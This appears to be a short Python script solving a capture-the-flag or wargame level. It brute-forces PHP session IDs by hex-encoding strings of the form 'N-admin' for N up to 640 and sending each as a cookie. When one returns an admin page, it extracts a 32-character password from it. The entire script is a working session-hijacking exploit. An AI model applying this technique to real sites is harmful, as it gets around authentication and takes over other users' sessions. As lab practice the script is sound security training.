import config
import os, re
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)
key = "You are an admin."

for i in range(1, 641):
	session_id = "{}-admin".format(i).encode("hex")
	response = get(url, auth=(user, password), cookies={"PHPSESSID" : session_id})
	if key in response.content:
		break

password = re.findall(r"\w{32}", response.content)[-1]

print(password)